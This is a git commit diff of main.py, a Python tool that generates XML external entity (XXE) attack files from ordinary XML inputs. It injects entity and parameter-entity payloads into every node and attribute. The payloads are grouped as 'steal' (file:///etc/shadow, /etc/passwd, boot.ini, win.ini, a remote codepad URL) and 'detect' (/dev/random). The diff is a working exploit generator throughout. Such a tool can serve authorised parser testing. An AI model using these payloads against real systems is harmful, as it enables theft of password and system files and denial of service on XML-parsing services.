ccd3598985447d48975451458edb896cb5b66941
Max <qiwi360@gmail.com>
2015-03-01 02:51:34 +0300

    * Parameter entity support added * Payloads can be divided into groups

--- main.py
+++ main.py
@@ -1,21 +1,10 @@
 # -*- coding: utf-8 -*-
-__author__ = 'Max'
-
+from xml.sax.saxutils import unescape
 from lxml import etree
 from optparse import OptionParser
-from xml.sax.saxutils import unescape
-import os.path
+import os
 
-BUILTIN_ENTITIES = ['file:///dev/random',
-                    'file:///etc/passwd',
-                    'file:///c:/boot.ini',
-                    'http://codepad.org/kfHNgnZj/raw.c']
-ENTITY_PREFIX = 'a'
-ENTITY_TEMPLATE = '<!ENTITY %s SYSTEM "%s">'
-ELEMENT_TEMPLATE = '<!ELEMENT %s ANY>'
-ATTLIST_TEMPLATE = '<!ATTLIST %s %s CDATA #REQUIRED>'
-ENTITY_PAYLOAD_TEMPLATE = '&%s;'  # ENTITY_PREFIX + number
-DOCTYPE_TEMPLATE = '<!DOCTYPE %s [ %s\n%s ]>'  # root_node_tag, dtd, entities
+__author__ = 'max'
 
 
 def parse_options():
@@ -29,152 +18,252 @@ def parse_options():
                           help='Custom entity body(optional). '
                                'Multiple entities supported(each with its own option prefix)')
     opt_parser.add_option('-n', '--file-per-node', dest='file_per_node',
-                          help='Use this flag to make XML-bombs with all the nodes and '
-                               'attributes of all the given files filled with payload '
-                               'for all the entities(built-in + provided)',
-                          action='store_true', default=False)
+                          help='Only one payload to be contained in a generated'
+                               ' file(payload per attribute/node).',
+                          action='store_false', default=True)
     opt_parser.add_option('-d', '--dtd', dest='dtd', action='store_true', default=False,
                           help='Use this flag to turn on DTD generation.')
+    opt_parser.add_option('-s', '--simple-header', dest='simple_header',
+                          action='store_true', default=False,
+                          help='simple_header - if the flag is up,'
+                               ' output files headers won\'t contain '
+                               'encoding attribute')
+    opt_parser.add_option('-m', '--modes', dest='modes', action='append',
+                          help='Type of payload to be generated. Available modes:'
+                               'S - stealing, D - detection, U - User provided')
 
-    return opt_parser.parse_args()
+    return opt_parser.parse_args()[0]
 
 
 def validate_options(options):
-    """Validate given options and consider them."""
+    """Validate given options."""
 
-    if options.files is None:
+    if options.files is None or len(options.files) <= 0:
         raise Exception("No XML files provided. Run the script with '-h' for help")
 
-    existing_files = [filename for filename in options.files if os.path.exists(filename) and os.path.isfile(filename)]
+    existing_files = list(set(
+        [filename for filename in options.files
+         if os.path.exists(filename) and os.path.isfile(filename)]))
 
     if len(existing_files) <= 0:
         raise Exception("No XML files provided. Run the script with '-h' for help.\n\t\t"
                         "Probably, none of given files is present.")
 
-    used_entities = set()
+    options.files = existing_files
 
-    if options.entities is not None:
-        if options.file_per_node:
-            used_entities.add(options.entities[0])
-        else:
-            used_entities.update(BUILTIN_ENTITIES)
-            used_entities.update(options.entities)
-    else:
-        if options.file_per_node:
-            used_entities.add(BUILTIN_ENTITIES[0])
-        else:
-            used_entities.update(BUILTIN_ENTITIES)
+    available_modes = ('S', 'D')
+    active_modes = []
+    if options.modes is not None:
+        active_modes = list(set(
+            [mode for mode in options.modes
+             if mode in available_modes]
+        ))
 
-    #  Turn a set of entities to a list and return it
-    return existing_files, list(used_entities)
+    # If no modes set, put all available modes on
+    options.modes = active_modes if len(active_modes) > 0 else available_modes
+
+    return options
 
 
-def build_dtd(tree):
-    """Returns a DTD description of a given tree in a form of a string."""
+def append_payloads(options):
+    """Append payloads of needed types to the options."""
 
-    dtd_elements = set()
+    payloads = {
+        'D': [  # detect
+                'file:///dev/random',
+        ],
+        'S': [  # steal
+                'file:///etc/shadow',
+                'file:///etc/passwd',
+                'file:///c:/boot.ini',
+                'http://codepad.org/kfHNgnZj/raw.c',
+                'file:///c:/winnt/win.ini',
+        ]}
 
-    for elem in tree.iter():
-        dtd_elements.add(ELEMENT_TEMPLATE % elem.tag)
+    if options.entities is not None and len(options.entities) > 0:
+        payloads['U'] = options.entities
+        options.modes = tuple(list(options.modes) + ['U'])
 
-        for attr_name in elem.attrib.keys():
-            dtd_elements.add(ATTLIST_TEMPLATE % (elem.tag, attr_name))
+    options.payloads = {}
 
-    return '\n\t'.join(dtd_elements)
+    for mode in options.modes:
+        options.payloads[mode] = payloads[mode]
+
+    return options
 
 
-def build_trees_and_dtds(files, options):
-    """Returns a list of pairs of the following structure: (tree, dtd_of_the_tree)."""
-    return [(lambda a: (a, build_dtd(a) if options.dtd else ''))(etree.parse(filename)) for filename in files]
+def build_trees_and_dtds(options):
+    """Builds trees(and DTD's if needed) in the form
+    of pairs of the following structure: (tree, dtd_of_the_tree),
+    and appends it to the options as 'trees_and_dtds' field."""
+
+    def build_dtd(tree):
+        """Returns a DTD description of a given tree in a form of a string."""
+
+        element_template = '<!ELEMENT %s ANY>'
+        attlist_template = '<!ATTLIST %s %s CDATA #REQUIRED>'
+
+        dtd_elements = set()
+
+        for elem in tree.iter():
+            dtd_elements.add(element_template % elem.tag)
+
+            for attr_name in elem.attrib.keys():
+                dtd_elements.add(attlist_template % (elem.tag, attr_name))
+
+        return '\n\t'.join(dtd_elements)
+
+    options.trees_and_dtds = [(lambda a: (a, build_dtd(a) if options.dtd else ''))(etree.parse(filename)) for filename
+                              in options.files]
+
+    return options
 
 
 def build_entity(name, value):
     """Returns a single formed entity in a form of a string."""
-    return ENTITY_TEMPLATE % (name, value)
+    entity_template = '<!ENTITY %s SYSTEM "%s">'
+    return entity_template % (name, value)
 
 
-def build_entities(values):
-    """Returns a list of entities in a form of a string."""
-    return '\n\t'.join([build_entity(ENTITY_PREFIX + str(i), value) for i, value in enumerate(values)])
+def build_entities(values, static_tag=None):
+    """Returns a list of entities in a form of a string.
+    If static_prefix argument is passed, it will be used to
+    form entities."""
+    entity_prefix = 'a'
+    return '\n\t'.join([build_entity(entity_prefix + str(i)
+                                     if static_tag is None else static_tag,
+                                     value) for i, value in enumerate(values)])
 
 
-def build_entity_payload(count):
-    """Returns payload, consisted of 'count' number of entities.
-    Formed from ENTITY_PAYLOAD_TEMPLATE."""
-    return ''.join([ENTITY_PAYLOAD_TEMPLATE % (ENTITY_PREFIX + str(i)) for i in range(0, count)])
+def build_entity_payload(entity_prefix, count=1):
+    """Returns entity payload with given prefix."""
+    entity_payload_template = '&%s;'
+    return ''.join([entity_payload_template % (entity_prefix + str(i)
+                                               if count > 1 else entity_prefix)
+                    for i in range(0, count)])
 
 
-def build_doctype(root_tag, dtd, entities):
+def build_doctype_payload(payload_prefix, count=1):
+    """Returns payload with given prefix."""
+    payload_template = '%s;'
+    return ''.join(['%' + (payload_template % (payload_prefix + str(i)
+                                               if count > 1 else payload_prefix))
+                    for i in range(0, count)])
+
+
+def build_doctype(root_tag, dtd, entities, doctype_payload):
     """Returns a formed DOCTYPE element; made on the basis of
     DOCTYPE_TEMPLATE and consists of the name of the document
     root tag, DTD of the given XML and given entities
     description(string)."""
-    return DOCTYPE_TEMPLATE % (root_tag, dtd, '\t' + entities)
+    doctype_template = '<!DOCTYPE %s [ %s\n%s %s ]>'  # root_node_tag, dtd, entities
+    return doctype_template % (root_tag, dtd, '\t' + entities, doctype_payload)
 
 
-def save_output_file(filename, tree, doctype):
+def save_output_file(filename, tree, doctype, simple_xml_declaration=True):
+    simple_xml_declaration_header = '<?xml version="1.0"?>\n'
     result = unescape(
-        etree.tostring(tree, xml_declaration=True,
+        etree.tostring(tree, xml_declaration=not simple_xml_declaration,
                        encoding=tree.docinfo.encoding,
                        doctype=doctype,
                        pretty_print=True).decode(tree.docinfo.encoding))
-    print('Working on file: %s' % tree.getroot().base)
-    open(filename, 'w').write(result)
+    print('Working on file: %s; xxe bomb filename: %s' % (tree.getroot().base, filename))
+    open(filename, 'w').write(simple_xml_declaration_header + result
+                              if simple_xml_declaration else
+                              result)
 
 
-def build_bomb_payload_per_node(entities):
+def build_bomb_payload_per_node(options):
     """Builds XML-bombs; each bomb is about to contain entity
     in a single node or attribute."""
+
+    if not options.file_per_node:
+        return options
 
     total_files = 0  # number of generated files
     p = 0  # payloads counter
 
-    for entity in entities:
-        for tree, dtd in trees:
-            doctype = build_doctype(tree.getroot().tag, dtd, build_entities([entity]))
-            filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]
+    for mode, payloads in options.payloads.items():
+        for tree, dtd in options.trees_and_dtds:
+            for payload in payloads:
+                doctype_payload_set = False  # if we already crafted a doctype-placed payload
+                i = 0  # insertions counter
 
-            i = 0  # insertions counter
+                filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]
 
-            for elem in tree.iter():
-                for attr_name in elem.attrib.keys():
-                    buf = elem.attrib[attr_name]
-                    elem.attrib[attr_name] = build_entity_payload(1)
+                if not doctype_payload_set:
+                    doctype_payload_content = build_doctype_payload(mode)
+                    doctype = build_doctype(tree.getroot().tag, dtd, build_entities([payload], '% ' + mode),
+                                            doctype_payload_content)
 
-                    final_filename = '%s_%d_%d.xml' % (filename_prefix, p, i)
-                    save_output_file(final_filename, tree, doctype)
+                    final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
+                    save_output_file(final_filename, tree, doctype, options.simple_header)
 
-                    elem.attrib[attr_name] = buf
+                    doctype_payload_set = True  # no needed anymore for current tree
                     i += 1
 
-                buf = elem.text
-                elem.text = build_entity_payload(1)
+                doctype = build_doctype(tree.getroot().tag, dtd, build_entities([payload], mode), '')
 
-                final_filename = '%s_%d_%d.xml' % (filename_prefix, p, i)
-                save_output_file(final_filename, tree, doctype)
+                for elem in tree.iter():
+                    for attr_name in elem.attrib.keys():
+                        buf = elem.attrib[attr_name]
+                        elem.attrib[attr_name] = build_entity_payload(mode)
 
-                elem.text = buf
-                i += 1
+                        final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
+                        save_output_file(final_filename, tree, doctype, options.simple_header)
 
-            total_files += i
+                        elem.attrib[attr_name] = buf
+                        i += 1
+
+                    buf = elem.text
+                    elem.text = build_entity_payload(mode)
+
+                    final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
+                    save_output_file(final_filename, tree, doctype, options.simple_header)
+
+                    elem.text = buf
+                    i += 1
+
+                total_files += i
 
         p += 1
 
     print('Total number of generated files: %d' % total_files)
 
+    return options
 
-def build_bomb_put_payload_everywhere(entities):
+
+def build_bomb_put_payload_everywhere(options):
     """Builds a single XML-bomb, which contains all the
     entities as a payload in every single attribute and node."""
 
-    payload = build_entity_payload(len(entities))
-    entities = build_entities(entities)
+    if not not options.file_per_node:
+        return options
 
-    for tree, dtd in trees:
-        doctype = build_doctype(tree.getroot().tag, dtd, entities)
+    payload_prefix = 'a'
+
+    payloads = [value for key in options.payloads.keys()
+                for value in options.payloads[key]]
+
+    payload = build_entity_payload('a', len(payloads))
+
+    doctype = ''
+
+    doctype_payload_set = False
+
+    for tree, dtd in options.trees_and_dtds:
         filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]
 
         i = 0  # insertions counter
+
+        if not doctype_payload_set:
+            doctype_payload_content = build_doctype_payload(payload_prefix)
+            doctype = build_doctype(tree.getroot().tag, dtd,
+                                    build_entities(payloads) +
+                                    '\n\t' + build_entities([payloads[0]], '% ' + payload_prefix),
+                                    doctype_payload_content)
+            doctype_payload_set = True
+            i += 1
 
         for elem in tree.iter():
             for attr_name in elem.attrib.keys():
@@ -190,19 +279,13 @@ def build_bomb_put_payload_everywhere(entities):
 
         print('Total number of insertions: %d; files generated: 1' % i)
 
+    return options
+
 
 if __name__ == '__main__':
-    try:
-        given_options = parse_options()[0]
-        attacked_files, entities_for_payload = validate_options(given_options)
-        trees = build_trees_and_dtds(attacked_files, given_options)
-
-        if given_options.file_per_node:
-            build_bomb_payload_per_node(entities_for_payload)
-        else:
-            build_bomb_put_payload_everywhere(entities_for_payload)
-    except Exception as e:
-        print('An exception occurred during the execution:')
-
-        for arg in e.args:
-            print('\t>>', arg)
+    valid_options = parse_options()
+    valid_options = validate_options(valid_options)
+    valid_options = append_payloads(valid_options)
+    valid_options = build_trees_and_dtds(valid_options)
+    valid_options = build_bomb_payload_per_node(valid_options)
+    valid_options = build_bomb_put_payload_everywhere(valid_options)
